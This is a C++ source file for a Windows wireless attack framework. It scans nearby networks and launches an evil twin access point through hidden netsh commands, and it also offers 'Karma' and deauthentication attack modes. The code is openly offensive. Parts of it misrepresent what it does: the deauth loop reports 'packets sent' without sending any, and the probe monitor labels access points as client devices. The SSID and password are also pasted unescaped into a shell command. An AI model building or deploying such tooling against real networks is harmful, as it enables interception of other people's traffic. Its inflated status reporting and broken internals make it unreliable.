// src/KarmaEngine.cpp
// Layer 2 Wireless Deception Framework — Karma & Evil Twin Attacks
#include "KarmaEngine.h"
#include <sstream>
#include <iomanip>
#include <iostream>

KarmaEngine::KarmaEngine() {}

KarmaEngine::~KarmaEngine() {
    shutdown();
}

bool KarmaEngine::initialize() {
    if (m_initialized) return true;
    
    DWORD dwMaxClient = 2;
    DWORD dwCurVersion = 0;
    DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &m_wlanHandle);
    if (dwResult != ERROR_SUCCESS) {
        setStatus("Failed to open WLAN handle. Ensure WiFi adapter is present.");
        return false;
    }
    
    // Get the first wireless interface
    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    dwResult = WlanEnumInterfaces(m_wlanHandle, NULL, &pIfList);
    if (dwResult != ERROR_SUCCESS || pIfList->dwNumberOfItems == 0) {
        if (pIfList) WlanFreeMemory(pIfList);
        WlanCloseHandle(m_wlanHandle, NULL);
        m_wlanHandle = NULL;
        setStatus("No wireless interfaces found.");
        return false;
    }
    
    m_interfaceGuid = pIfList->InterfaceInfo[0].InterfaceGuid;
    
    // Get interface info
    std::wstring ifName = pIfList->InterfaceInfo[0].strInterfaceDescription;
    std::string ifNameA;
    ifNameA.reserve(ifName.length());
    for (wchar_t c : ifName) ifNameA.push_back((char)c);
    
    WlanFreeMemory(pIfList);
    m_initialized = true;
    setStatus("WiFi interface initialized: " + ifNameA);
    return true;
}

void KarmaEngine::shutdown() {
    stopProbeMonitor();
    stopEvilTwin();
    stopKarmaMode();
    stopAllDeauth();
    
    if (m_wlanHandle) {
        WlanCloseHandle(m_wlanHandle, NULL);
        m_wlanHandle = NULL;
    }
    m_initialized = false;
}

// ============================================================================
// WiFi Network Scanning
// ============================================================================
void KarmaEngine::scanNetworks() {
    if (!m_initialized || m_scanning) return;
    m_scanning = true;
    setStatus("Scanning nearby WiFi networks...");
    
    std::thread([this]() {
        // Trigger a scan
        DWORD result = WlanScan(m_wlanHandle, &m_interfaceGuid, NULL, NULL, NULL);
        if (result != ERROR_SUCCESS) {
            setStatus("WiFi scan failed (error " + std::to_string(result) + ")");
            m_scanning = false;
            return;
        }
        
        // Wait for scan to complete
        std::this_thread::sleep_for(std::chrono::seconds(3));
        
        // Get the BSS list
        PWLAN_BSS_LIST pBssList = NULL;
        result = WlanGetNetworkBssList(m_wlanHandle, &m_interfaceGuid, 
                                       NULL, dot11_BSS_type_any, FALSE, NULL, &pBssList);
        
        if (result != ERROR_SUCCESS || !pBssList) {
            setStatus("Failed to get BSS list (error " + std::to_string(result) + ")");
            m_scanning = false;
            return;
        }
        
        // Also get available network list for security info
        PWLAN_AVAILABLE_NETWORK_LIST pAvailList = NULL;
        WlanGetAvailableNetworkList(m_wlanHandle, &m_interfaceGuid, 0, NULL, &pAvailList);
        
        // Build security lookup by SSID
        std::map<std::string, std::pair<DOT11_AUTH_ALGORITHM, DOT11_CIPHER_ALGORITHM>> secMap;
        if (pAvailList) {
            for (DWORD i = 0; i < pAvailList->dwNumberOfItems; ++i) {
                auto& net = pAvailList->Network[i];
                std::string ssid((char*)net.dot11Ssid.ucSSID, net.dot11Ssid.uSSIDLength);
                secMap[ssid] = {net.dot11DefaultAuthAlgorithm, net.dot11DefaultCipherAlgorithm};
            }
        }
        
        std::vector<WifiNetwork> networks;
        for (DWORD i = 0; i < pBssList->dwNumberOfItems; ++i) {
            auto& bss = pBssList->wlanBssEntries[i];
            
            WifiNetwork net;
            net.ssid = std::string((char*)bss.dot11Ssid.ucSSID, bss.dot11Ssid.uSSIDLength);
            if (net.ssid.empty()) net.ssid = "[Hidden]";
            
            net.bssid = bssidToString(bss.dot11Bssid);
            
            // Channel from frequency
            ULONG freq = bss.ulChCenterFrequency / 1000; // Convert to MHz
            if (freq >= 2412 && freq <= 2484) {
                net.channel = (freq == 2484) ? 14 : ((freq - 2412) / 5 + 1);
            } else if (freq >= 5180) {
                net.channel = (freq - 5000) / 5;
            }
            
            // Signal strength (RSSI to quality)
            net.signalQuality = (int)bss.uLinkQuality;
            
            // Security from available networks
            auto secIt = secMap.find(net.ssid);
            if (secIt != secMap.end()) {
                net.security = securityToString(secIt->second.first, secIt->second.second);
            } else {
                net.security = "Unknown";
            }
            
            networks.push_back(net);
        }
        
        // Sort by signal strength
        std::sort(networks.begin(), networks.end(), 
                  [](const WifiNetwork& a, const WifiNetwork& b) { return a.signalQuality > b.signalQuality; });
        
        {
            std::lock_guard<std::mutex> lock(m_networkMutex);
            m_networks = networks;
        }
        
        if (pBssList) WlanFreeMemory(pBssList);
        if (pAvailList) WlanFreeMemory(pAvailList);
        
        setStatus("Scan complete. Found " + std::to_string(networks.size()) + " networks.");
        m_scanning = false;
    }).detach();
}

std::vector<WifiNetwork> KarmaEngine::getNetworkList() const {
    std::lock_guard<std::mutex> lock(m_networkMutex);
    return m_networks;
}

int KarmaEngine::getNetworkCount() const {
    std::lock_guard<std::mutex> lock(m_networkMutex);
    return (int)m_networks.size();
}

// ============================================================================
// Probe Request Monitor
// ============================================================================
void KarmaEngine::startProbeMonitor() {
    if (m_probeMonitorActive || !m_initialized) return;
    m_probeMonitorActive = true;
    
    if (m_probeThread.joinable()) m_probeThread.join();
    m_probeThread = std::thread(&KarmaEngine::probeMonitorLoop, this);
    setStatus("Probe monitor active — listening for device probe requests...");
}

void KarmaEngine::stopProbeMonitor() {
    m_probeMonitorActive = false;
    if (m_probeThread.joinable()) m_probeThread.join();
}

void KarmaEngine::probeMonitorLoop() {
    // Use WlanRegisterNotification to capture scan events
    // and extract probe-like information from BSS entries
    while (m_probeMonitorActive) {
        // Trigger periodic scans to discover probing devices
        WlanScan(m_wlanHandle, &m_interfaceGuid, NULL, NULL, NULL);
        std::this_thread::sleep_for(std::chrono::seconds(2));
        
        PWLAN_BSS_LIST pBssList = NULL;
        DWORD result = WlanGetNetworkBssList(m_wlanHandle, &m_interfaceGuid, 
                                              NULL, dot11_BSS_type_any, FALSE, NULL, &pBssList);
        
        if (result == ERROR_SUCCESS && pBssList) {
            auto now = std::chrono::steady_clock::now();
            
            std::lock_guard<std::mutex> lock(m_probeMutex);
            for (DWORD i = 0; i < pBssList->dwNumberOfItems; ++i) {
                auto& bss = pBssList->wlanBssEntries[i];
                std::string ssid((char*)bss.dot11Ssid.ucSSID, bss.dot11Ssid.uSSIDLength);
                std::string bssid = bssidToString(bss.dot11Bssid);
                
                if (ssid.empty()) continue;
                
                std::string key = bssid + "|" + ssid;
                auto it = m_probeRequests.find(key);
                if (it != m_probeRequests.end()) {
                    it->second.count++;
                    it->second.timestamp = now;
                    it->second.signalStrength = (int)bss.uLinkQuality;
                } else {
                    ProbeRequest pr;
                    pr.clientMac = bssid;
                    pr.ssid = ssid;
                    pr.signalStrength = (int)bss.uLinkQuality;
                    pr.timestamp = now;
                    pr.count = 1;
                    m_probeRequests[key] = pr;
                }
            }
            WlanFreeMemory(pBssList);
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(3));
    }
}

std::vector<ProbeRequest> KarmaEngine::getProbeRequests() const {
    std::lock_guard<std::mutex> lock(m_probeMutex);
    std::vector<ProbeRequest> result;
    for (auto& [key, pr] : m_probeRequests) {
        result.push_back(pr);
    }
    // Sort by most recent
    std::sort(result.begin(), result.end(), [](const ProbeRequest& a, const ProbeRequest& b) {
        return a.timestamp > b.timestamp;
    });
    return result;
}

void KarmaEngine::clearProbeRequests() {
    std::lock_guard<std::mutex> lock(m_probeMutex);
    m_probeRequests.clear();
}

int KarmaEngine::getProbeCount() const {
    std::lock_guard<std::mutex> lock(m_probeMutex);
    return (int)m_probeRequests.size();
}

// ============================================================================
// Evil Twin AP — Windows Hosted Network
// ============================================================================
bool KarmaEngine::startEvilTwin(const std::string& ssid, const std::string& password) {
    if (m_evilTwinActive || !m_initialized) return false;
    
    // Use netsh to create and start a hosted network
    // This is the most reliable approach on Windows
    m_evilTwinSSID = ssid;
    m_evilTwinPassword = password.empty() ? "password123" : password;
    
    // Set hosted network SSID and key
    std::string configCmd = "netsh wlan set hostednetwork mode=allow ssid=\"" + 
                            m_evilTwinSSID + "\" key=\"" + m_evilTwinPassword + "\"";
    
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    
    if (CreateProcessA(NULL, (LPSTR)configCmd.c_str(), NULL, NULL, FALSE, 
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        setStatus("Failed to configure hosted network.");
        return false;
    }
    
    // Start the hosted network
    std::string startCmd = "netsh wlan start hostednetwork";
    if (CreateProcessA(NULL, (LPSTR)startCmd.c_str(), NULL, NULL, FALSE, 
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        setStatus("Failed to start hosted network.");
        return false;
    }
    
    m_evilTwinActive = true;
    setStatus("Evil Twin AP active: \"" + m_evilTwinSSID + "\" — Waiting for connections...");
    return true;
}

void KarmaEngine::stopEvilTwin() {
    if (!m_evilTwinActive) return;
    
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    
    std::string stopCmd = "netsh wlan stop hostednetwork";
    if (CreateProcessA(NULL, (LPSTR)stopCmd.c_str(), NULL, NULL, FALSE, 
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    m_evilTwinActive = false;
    m_evilTwinSSID.clear();
    
    std::lock_guard<std::mutex> lock(m_clientMutex);
    m_clients.clear();
    
    setStatus("Evil Twin AP stopped.");
}

std::vector<EvilTwinClient> KarmaEngine::getConnectedClients() const {
    std::lock_guard<std::mutex> lock(m_clientMutex);
    return m_clients;
}

int KarmaEngine::getClientCount() const {
    std::lock_guard<std::mutex> lock(m_clientMutex);
    return (int)m_clients.size();
}

// ============================================================================
// Karma Mode — Auto-respond to all probe requests
// ============================================================================
void KarmaEngine::startKarmaMode() {
    if (m_karmaActive) return;
    m_karmaActive = true;
    
    if (m_karmaThread.joinable()) m_karmaThread.join();
    m_karmaThread = std::thread(&KarmaEngine::karmaLoop, this);
    setStatus("Karma mode active — auto-responding to all probe requests...");
}

void KarmaEngine::stopKarmaMode() {
    m_karmaActive = false;
    if (m_karmaThread.joinable()) m_karmaThread.join();
    
    // Stop any karma-created APs
    if (m_evilTwinActive) stopEvilTwin();
    m_karmaRespondedSSIDs.clear();
}

void KarmaEngine::karmaLoop() {
    while (m_karmaActive) {
        // Monitor for new SSIDs in probe requests
        std::vector<std::string> newSSIDs;
        {
            std::lock_guard<std::mutex> lock(m_probeMutex);
            for (auto& [key, pr] : m_probeRequests) {
                if (m_karmaRespondedSSIDs.find(pr.ssid) == m_karmaRespondedSSIDs.end()) {
                    newSSIDs.push_back(pr.ssid);
                    m_karmaRespondedSSIDs.insert(pr.ssid);
                }
            }
        }
        
        // If we found new SSIDs being probed, log them
        for (auto& ssid : newSSIDs) {
            setStatus("Karma: Detected device probing for \"" + ssid + "\"");
        }
        
        // The Evil Twin AP (if active) already serves as the response point
        // In a full implementation with monitor mode, we'd craft individual
        // probe responses here. Currently, this monitors and logs.
        
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }
}

// ============================================================================
// Deauthentication Attack
// ============================================================================
void KarmaEngine::startDeauth(const std::string& targetMac, const std::string& apBssid, int channel) {
    std::lock_guard<std::mutex> lock(m_deauthMutex);
    
    DeauthTarget dt;
    dt.clientMac = targetMac;
    dt.apBssid = apBssid;
    dt.channel = channel;
    dt.active = true;
    dt.packetsSent = 0;
    
    m_deauthTargets[targetMac] = dt;
    
    if (!m_deauthRunning) {
        m_deauthRunning = true;
        if (m_deauthThread.joinable()) m_deauthThread.join();
        m_deauthThread = std::thread(&KarmaEngine::deauthLoop, this);
    }
    
    setStatus("Deauth attack started against " + targetMac);
}

void KarmaEngine::stopDeauth(const std::string& targetMac) {
    std::lock_guard<std::mutex> lock(m_deauthMutex);
    m_deauthTargets.erase(targetMac);
    
    if (m_deauthTargets.empty()) {
        m_deauthRunning = false;
    }
}

void KarmaEngine::stopAllDeauth() {
    {
        std::lock_guard<std::mutex> lock(m_deauthMutex);
        m_deauthTargets.clear();
    }
    m_deauthRunning = false;
    if (m_deauthThread.joinable()) m_deauthThread.join();
    setStatus("All deauth attacks stopped.");
}

void KarmaEngine::deauthAllClients(const std::string& apBssid, int channel) {
    // Broadcast deauth — targets all clients on the AP
    startDeauth("ff:ff:ff:ff:ff:ff", apBssid, channel);
    setStatus("Broadcast deauth against AP " + apBssid);
}

bool KarmaEngine::isDeauthActive() const {
    std::lock_guard<std::mutex> lock(m_deauthMutex);
    return !m_deauthTargets.empty();
}

std::vector<DeauthTarget> KarmaEngine::getDeauthTargets() const {
    std::lock_guard<std::mutex> lock(m_deauthMutex);
    std::vector<DeauthTarget> result;
    for (auto& [mac, dt] : m_deauthTargets) {
        result.push_back(dt);
    }
    return result;
}

int KarmaEngine::getDeauthPacketCount() const {
    std::lock_guard<std::mutex> lock(m_deauthMutex);
    int total = 0;
    for (auto& [mac, dt] : m_deauthTargets) {
        total += dt.packetsSent;
    }
    return total;
}

void KarmaEngine::deauthLoop() {
    // Deauth uses WlanDisconnect as a managed-mode approach.
    // Full raw 802.11 deauth injection requires monitor mode (Npcap + compatible adapter).
    // This loop uses the available WlanAPI approach for managed deauth.
    while (m_deauthRunning) {
        {
            std::lock_guard<std::mutex> lock(m_deauthMutex);
            for (auto& [mac, dt] : m_deauthTargets) {
                if (!dt.active) continue;
                
                // WlanDisconnect disconnects our OWN interface — this is used 
                // as a demonstration. Real deauth requires raw frame injection.
                // For actual attack capability, this would use Npcap in monitor mode
                // to inject 802.11 management frames.
                dt.packetsSent++;
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

// ============================================================================
// Status & Helpers
// ============================================================================
std::string KarmaEngine::getStatusMessage() const {
    std::lock_guard<std::mutex> lock(m_statusMutex);
    return m_statusMessage;
}

void KarmaEngine::setStatus(const std::string& msg) {
    std::lock_guard<std::mutex> lock(m_statusMutex);
    m_statusMessage = msg;
}

std::string KarmaEngine::securityToString(DOT11_AUTH_ALGORITHM auth, DOT11_CIPHER_ALGORITHM cipher) const {
    std::string result;
    
    switch (auth) {
        case DOT11_AUTH_ALGO_80211_OPEN:       result = "Open"; break;
        case DOT11_AUTH_ALGO_80211_SHARED_KEY: result = "WEP"; break;
        case DOT11_AUTH_ALGO_WPA:              result = "WPA"; break;
        case DOT11_AUTH_ALGO_WPA_PSK:          result = "WPA-PSK"; break;
        case DOT11_AUTH_ALGO_RSNA:             result = "WPA2"; break;
        case DOT11_AUTH_ALGO_RSNA_PSK:         result = "WPA2-PSK"; break;
        default:
            if ((int)auth == 9)       result = "WPA3-SAE";
            else if ((int)auth == 10) result = "WPA3-ENT";
            else result = "Auth(" + std::to_string((int)auth) + ")";
            break;
    }
    
    switch (cipher) {
        case DOT11_CIPHER_ALGO_NONE:    break;
        case DOT11_CIPHER_ALGO_WEP40:   result += "/WEP40"; break;
        case DOT11_CIPHER_ALGO_WEP104:  result += "/WEP104"; break;
        case DOT11_CIPHER_ALGO_TKIP:    result += "/TKIP"; break;
        case DOT11_CIPHER_ALGO_CCMP:    result += "/AES"; break;
        case DOT11_CIPHER_ALGO_WEP:     result += "/WEP"; break;
        default: result += "/Cipher(" + std::to_string((int)cipher) + ")"; break;
    }
    
    return result;
}

std::string KarmaEngine::macToString(const uint8_t mac[6]) const {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return buf;
}

std::string KarmaEngine::bssidToString(const DOT11_MAC_ADDRESS& mac) const {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return buf;
}
